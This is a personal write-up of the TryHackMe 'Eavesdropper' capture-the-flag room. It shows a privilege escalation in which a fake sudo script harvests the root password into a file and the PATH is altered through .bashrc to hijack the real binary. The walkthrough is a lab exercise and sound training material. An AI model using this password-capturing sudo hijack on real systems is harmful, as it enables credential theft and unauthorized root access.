---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          THM
# CTF NAME          Eavesdropper
# DESCRIPTION       Listen closely, you might hear a password!
# DIFFICULTY        Medium 
# CTF LINK          https://tryhackme.com/r/room/eavesdropper 
```

```bash
Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.
You have access under `frank`, but you want to be `root`! How can you escalate privileges? If you listen closely, maybe you can uncover something that might help!
```

- I tried doing some manual enumaration looking for potential escalation paths. 
- I've discovered two listening ports, `35431` and `42240` and I've tunneled them to my box to try and access them. 

- However, both of them appeared as `tcpwrapped` after a nmap scan and I could not retrieve any information from them.

- So I used `pspy` to see what's going on in the background.

```
UID=0     PID=4624   | sudo cat /etc/shadow
```

- So the user `root` is using the `sudo cat /etc/shadow` command. It should NOT use `sudo` because it's already root, but since this is misconfigured we can hijack the sudo binary and see what's the password.

- In order to do that, I've created a new `sudo` file with the following content

```bash
#!/bin/bash

read -p 'givemeyourpassword: ' passs
echo $passs > /home/frank/a.txt
```

- Do a `chmod +x` on this new `sudo` file after you create it.

```
-rwxrwxr-x 1 frank frank      63 Jul 23 11:12 sudo
```

- However, we need to alter the $PATH variable in order to point to this `sudo` binary and not the usual `/usr/bin/sudo` binary.

- To do this, use

```
export PATH=/home/frank:$PATH
```

- And, if needed, you can add the same line to the top of `.bashrc` file. 
- Use `source .bashrc` to reload the file (assuming you're already in /home/frank). 

- After a short while, the `a.txt` file should containt a password. That's the root password. 

- The only remaining thing is to read the flag from `/root/flag.txt`.